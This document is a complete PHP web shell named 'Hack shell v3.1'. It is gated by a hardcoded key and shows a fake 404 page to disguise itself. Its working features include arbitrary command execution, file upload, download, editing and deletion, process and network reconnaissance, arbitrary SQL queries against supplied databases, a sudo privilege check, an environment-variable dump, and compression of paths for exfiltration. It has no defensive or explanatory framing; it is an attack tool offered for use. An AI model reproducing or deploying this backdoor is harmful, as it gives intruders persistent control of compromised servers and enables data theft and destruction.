<?php
// Secret key for authentication
$SECRET_KEY = "x4i9z2k7m8n3p6q0r5t1v8w9y2"; // Change this to a strong, unique key for access
error_reporting(0); // Suppress errors for cleaner output

// Check for valid secret key
if (!isset($_GET['key']) || $_GET['key'] !== $SECRET_KEY) {
    http_response_code(404);
    echo "<h1>404 - Page Not Found</h1>";
    exit;
}

// System Information
function getSystemInfo() {
    $info = [];
    $info['OS'] = php_uname();
    $info['PHP Version'] = phpversion();
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'];
    $info['Disk Free Space'] = round(disk_free_space("/") / (1024*1024*1024), 2) . " GB";
    $info['Current User'] = get_current_user();
    $info['Upload Max Filesize'] = ini_get('upload_max_filesize');
    $info['Post Max Size'] = ini_get('post_max_size');
    $info['File Uploads Enabled'] = ini_get('file_uploads') ? 'Yes' : 'No';
    return $info;
}

// Command Execution
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command . " 2>&1");
    $cmd_result = htmlspecialchars($output);
}

// File Upload with Enhanced Error Handling
if (isset($_FILES['upload_file'])) {
    $upload_dir = realpath(getcwd()) . "/";
    $upload_file = $upload_dir . basename($_FILES['upload_file']['name']);
    $upload_result = "";

    // Check for upload errors
    if ($_FILES['upload_file']['error'] !== UPLOAD_ERR_OK) {
        switch ($_FILES['upload_file']['error']) {
            case UPLOAD_ERR_INI_SIZE:
                $upload_result = "UPLOAD FAILED: File exceeds upload_max_filesize (" . ini_get('upload_max_filesize') . ")";
                break;
            case UPLOAD_ERR_FORM_SIZE:
                $upload_result = "UPLOAD FAILED: File exceeds MAX_FILE_SIZE in form";
                break;
            case UPLOAD_ERR_PARTIAL:
                $upload_result = "UPLOAD FAILED: File only partially uploaded";
                break;
            case UPLOAD_ERR_NO_FILE:
                $upload_result = "UPLOAD FAILED: No file was uploaded";
                break;
            case UPLOAD_ERR_NO_TMP_DIR:
                $upload_result = "UPLOAD FAILED: Missing temporary directory";
                break;
            case UPLOAD_ERR_CANT_WRITE:
                $upload_result = "UPLOAD FAILED: Cannot write to disk";
                break;
            case UPLOAD_ERR_EXTENSION:
                $upload_result = "UPLOAD FAILED: A PHP extension stopped the upload";
                break;
            default:
                $upload_result = "UPLOAD FAILED: Unknown error";
        }
    } elseif (!is_writable($upload_dir)) {
        $upload_result = "UPLOAD FAILED: Directory ($upload_dir) is not writable";
    } elseif (file_exists($upload_file)) {
        $upload_result = "UPLOAD FAILED: File already exists";
    } elseif (!is_uploaded_file($_FILES['upload_file']['tmp_name'])) {
        $upload_result = "UPLOAD FAILED: File was not uploaded via HTTP POST";
    } else {
        // Attempt to move the uploaded file
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_file)) {
            $upload_result = "UPLOAD SUCCESS: " . htmlspecialchars(basename($_FILES['upload_file']['name']));
        } else {
            $upload_result = "UPLOAD FAILED: Could not move file to $upload_file";
        }
    }

    // Log upload attempt for debugging (if possible)
    $log_message = date('Y-m-d H:i:s') . " - Upload attempt: " . $upload_result . "\n";
    $log_file = $upload_dir . "upload_log.txt";
    if (is_writable($upload_dir)) {
        file_put_contents($log_file, $log_message, FILE_APPEND);
    }
}

// File Download
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// File Deletion
if (isset($_GET['delete'])) {
    $file = realpath($_GET['delete']);
    if (file_exists($file)) {
        if (is_file($file)) {
            unlink($file);
            $delete_result = "FILE DELETED: " . htmlspecialchars(basename($file));
        } elseif (is_dir($file)) {
            rmdir($file);
            $delete_result = "DIRECTORY DELETED: " . htmlspecialchars(basename($file));
        }
    } else {
        $delete_result = "DELETION FAILED: File/Directory not found";
    }
}

// File Editing
if (isset($_GET['edit'])) {
    $edit_file = realpath($_GET['edit']);
    if (file_exists($edit_file) && is_file($edit_file)) {
        $file_content = htmlspecialchars(file_get_contents($edit_file));
    }
}
if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['file_path'])) {
    $file_path = realpath($_POST['file_path']);
    if (file_exists($file_path) && is_writable($file_path)) {
        file_put_contents($file_path, $_POST['file_content']);
        $edit_result = "FILE SAVED: " . htmlspecialchars(basename($file_path));
    } else {
        $edit_result = "SAVE FAILED: File not writable or not found";
    }
}

// Process Listing
if (isset($_GET['processes'])) {
    $process_output = shell_exec("ps aux 2>&1");
    $process_result = htmlspecialchars($process_output);
}

// Network Information
if (isset($_GET['network'])) {
    $network_output = shell_exec("netstat -tulnp 2>&1 || ss -tulnp 2>&1");
    $network_result = htmlspecialchars($network_output);
}

// Database Access (MySQL)
if (isset($_POST['sql_query'])) {
    $db_host = $_POST['db_host'] ?? 'localhost';
    $db_user = $_POST['db_user'] ?? '';
    $db_pass = $_POST['db_pass'] ?? '';
    $db_name = $_POST['db_name'] ?? '';
    $sql_query = $_POST['sql_query'];
    
    try {
        $conn = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $conn->query($sql_query);
        $sql_result = "<pre>";
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $sql_result .= htmlspecialchars(print_r($row, true)) . "\n";
        }
        $sql_result .= "</pre>";
    } catch (PDOException $e) {
        $sql_result = "SQL ERROR: " . htmlspecialchars($e->getMessage());
    }
}

// Privilege Escalation Check
if (isset($_GET['privileges'])) {
    $priv_output = shell_exec("whoami && id && sudo -l 2>&1");
    $priv_result = htmlspecialchars($priv_output);
}

// Environment Variables
if (isset($_GET['env'])) {
    $env_vars = [];
    foreach ($_SERVER as $key => $value) {
        $env_vars[] = "$key: $value";
    }
    $env_result = htmlspecialchars(implode("\n", $env_vars));
}

// File Compression
if (isset($_POST['compress'])) {
    $compress_path = realpath($_POST['compress_path']);
    if (file_exists($compress_path)) {
        $zip_name = basename($compress_path) . ".zip";
        $zip = new ZipArchive();
        if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
            if (is_dir($compress_path)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($compress_path), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($files as $file) {
                    $file = realpath($file);
                    if (is_dir($file)) continue;
                    $zip->addFile($file, str_replace($compress_path . '/', '', $file));
                }
            } else {
                $zip->addFile($compress_path, basename($compress_path));
            }
            $zip->close();
            $compress_result = "COMPRESSED: $zip_name";
        } else {
            $compress_result = "COMPRESSION FAILED";
        }
    } else {
        $compress_result = "PATH NOT FOUND";
    }
}

// Directory Traversal
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!is_dir($dir)) $dir = getcwd();
$files = scandir($dir);
$file_list = "";
$parent_dir = dirname($dir);
foreach ($files as $file) {
    if ($file != "." && $file != "..") {
        $full_path = $dir . "/" . $file;
        $file_list .= "<li>";
        $file_list .= "<a href='?key=$SECRET_KEY&dir=" . urlencode($full_path) . "' class='file-link'>" . htmlspecialchars($file) . "</a> ";
        $file_list .= "(" . (is_dir($full_path) ? "DIR" : "FILE") . ") ";
        if (!is_dir($full_path)) {
            $file_list .= "[<a href='?key=$SECRET_KEY&edit=" . urlencode($full_path) . "' class='action-link'>EDIT</a>] ";
            $file_list .= "[<a href='?key=$SECRET_KEY&download=" . urlencode($full_path) . "' class='action-link'>DOWNLOAD</a>] ";
        }
        $file_list .= "[<a href='?key=$SECRET_KEY&delete=" . urlencode($full_path) . "' class='action-link' onclick='return confirm(\"Delete " . htmlspecialchars($file) . "?\")'>DELETE</a>]";
        $file_list .= "</li>";
    }
}

// Get system info
$sys_info = getSystemInfo();
?>

<html>
<head>
    <title>Hack shell v3.1</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 20px;
        }
        h2, h3 { color: #0f0; text-shadow: 0 0 5px #0f0; }
        pre { background: #111; padding: 10px; border: 1px solid #0f0; }
        input[type="text"], input[type="file"], input[type="password"], textarea {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 5px;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #0f0;
            color: #000;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"]:hover { background: #0a0; }
        ul { list-style-type: none; padding: 0; }
        .file-link, .action-link { color: #0f0; text-decoration: none; }
        .file-link:hover, .action-link:hover { text-decoration: underline; text-shadow: 0 0 5px #0f0; }
        .back-link { color: #f00; font-weight: bold; }
        .terminal-output { white-space: pre-wrap; }
        .sys-info { background: #111; padding: 10px; border: 1px solid #0f0; margin-bottom: 20px; }
        textarea { width: 500px; height: 300px; }
    </style>
    <script>
        function typeWriter(text, elementId, speed = 50) {
            let i = 0;
            const element = document.getElementById(elementId);
            element.innerHTML = "";
            function type() {
                if (i < text.length) {
                    element.innerHTML += text.charAt(i);
                    i++;
                    setTimeout(type, speed);
                }
            }
            type();
        }

        window.onload = function() {
            <?php if (isset($cmd_result)) { ?>
                typeWriter(<?php echo json_encode($cmd_result); ?>, 'cmd-output');
            <?php } ?>
            <?php if (isset($upload_result)) { ?>
                typeWriter(<?php echo json_encode($upload_result); ?>, 'upload-output');
            <?php } ?>
            <?php if (isset($delete_result)) { ?>
                typeWriter(<?php echo json_encode($delete_result); ?>, 'delete-output');
            <?php } ?>
            <?php if (isset($edit_result)) { ?>
                typeWriter(<?php echo json_encode($edit_result); ?>, 'edit-output');
            <?php } ?>
            <?php if (isset($process_result)) { ?>
                typeWriter(<?php echo json_encode($process_result); ?>, 'process-output');
            <?php } ?>
            <?php if (isset($network_result)) { ?>
                typeWriter(<?php echo json_encode($network_result); ?>, 'network-output');
            <?php } ?>
            <?php if (isset($sql_result)) { ?>
                typeWriter(<?php echo json_encode($sql_result); ?>, 'sql-output');
            <?php } ?>
            <?php if (isset($priv_result)) { ?>
                typeWriter(<?php echo json_encode($priv_result); ?>, 'priv-output');
            <?php } ?>
            <?php if (isset($env_result)) { ?>
                typeWriter(<?php echo json_encode($env_result); ?>, 'env-output');
            <?php } ?>
            <?php if (isset($compress_result)) { ?>
                typeWriter(<?php echo json_encode($compress_result); ?>, 'compress-output');
            <?php } ?>
        };
    </script>
</head>
<body>
    <h2>[- HACKER SHELL v3.1 -]</h2>

    <!-- System Information -->
    <h3>SYSTEM INTEL</h3>
    <div class="sys-info">
        <p>OS: <?php echo htmlspecialchars($sys_info['OS']); ?></p>
        <p>PHP Version: <?php echo htmlspecialchars($sys_info['PHP Version']); ?></p>
        <p>Server Software: <?php echo htmlspecialchars($sys_info['Server Software']); ?></p>
        <p>Free Disk Space: <?php echo htmlspecialchars($sys_info['Disk Free Space']); ?></p>
        <p>Current User: <?php echo htmlspecialchars($sys_info['Current User']); ?></p>
        <p>Upload Max Filesize: <?php echo htmlspecialchars($sys_info['Upload Max Filesize']); ?></p>
        <p>Post Max Size: <?php echo htmlspecialchars($sys_info['Post Max Size']); ?></p>
        <p>File Uploads Enabled: <?php echo htmlspecialchars($sys_info['File Uploads Enabled']); ?></p>
    </div>

    <!-- Command Execution -->
    <h3>TERMINAL ACCESS</h3>
    <form method="POST">
        <input type="text" name="cmd" placeholder="> whoami" style="width: 300px;">
        <input type="submit" value="EXECUTE">
    </form>
    <?php if (isset($cmd_result)) { ?>
        <pre><span id="cmd-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- File Upload -->
    <h3>FILE INFILTRATION</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="MAX_FILE_SIZE" value="10485760"> <!-- 10MB limit -->
        <input type="file" name="upload_file">
        <input type="submit" value="INFILTRATE">
    </form>
    <?php if (isset($upload_result)) { ?>
        <pre><span id="upload-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- File Editing -->
    <h3>FILE MODIFICATION</h3>
    <?php if (isset($file_content) && isset($edit_file)) { ?>
        <form method="POST">
            <p>Editing: <?php echo htmlspecialchars($edit_file); ?></p>
            <textarea name="file_content"><?php echo $file_content; ?></textarea><br>
            <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($edit_file); ?>">
            <input type="submit" name="save_file" value="SAVE">
        </form>
    <?php } ?>
    <?php if (isset($edit_result)) { ?>
        <pre><span id="edit-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- File Deletion -->
    <?php if (isset($delete_result)) { ?>
        <pre><span id="delete-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- Process Listing -->
    <h3>PROCESS RECON</h3>
    <p><a href="?key=<?php echo $SECRET_KEY; ?>&processes=1" class="action-link">LIST PROCESSES</a></p>
    <?php if (isset($process_result)) { ?>
        <pre><span id="process-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- Network Information -->
    <h3>NETWORK INTEL</h3>
    <p><a href="?key=<?php echo $SECRET_KEY; ?>&network=1" class="action-link">SHOW NETWORK INFO</a></p>
    <?php if (isset($network_result)) { ?>
        <pre><span id="network-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- Database Access -->
    <h3>DATABASE ACCESS</h3>
    <form method="POST">
        <input type="text" name="db_host" placeholder="DB Host" style="width: 100px;">
        <input type="text" name="db_user" placeholder="DB User" style="width: 100px;">
        <input type="password" name="db_pass" placeholder="DB Pass" style="width: 100px;">
        <input type="text" name="db_name" placeholder="DB Name" style="width: 100px;"><br>
        <textarea name="sql_query" placeholder="SELECT * FROM users;"></textarea><br>
        <input type="submit" value="EXECUTE QUERY">
    </form>
    <?php if (isset($sql_result)) { ?>
        <pre><span id="sql-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- Privilege Escalation Check -->
    <h3>PRIVILEGE CHECK</h3>
    <p><a href="?key=<?php echo $SECRET_KEY; ?>&privileges=1" class="action-link">CHECK PRIVILEGES</a></p>
    <?php if (isset($priv_result)) { ?>
        <pre><span id="priv-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- Environment Variables -->
    <h3>ENVIRONMENT VARIABLES</h3>
    <p><a href="?key=<?php echo $SECRET_KEY; ?>&env=1" class="action-link">LIST ENV VARS</a></p>
    <?php if (isset($env_result)) { ?>
        <pre><span id="env-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- File Compression -->
    <h3>FILE COMPRESSION</h3>
    <form method="POST">
        <input type="text" name="compress_path" placeholder="Path to compress" style="width: 300px;">
        <input type="submit" name="compress" value="COMPRESS">
    </form>
    <?php if (isset($compress_result)) { ?>
        <pre><span id="compress-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- File Browser -->
    <h3>SYSTEM EXPLORATION</h3>
    <p>CURRENT SECTOR: <?php echo htmlspecialchars($dir); ?></p>
    <p><a href="?key=<?php echo $SECRET_KEY; ?>&dir=<?php echo urlencode($parent_dir); ?>" class="back-link">[BACK]</a></p>
    <ul>
        <?php echo $file_list; ?>
    </ul>
</body>
</html>
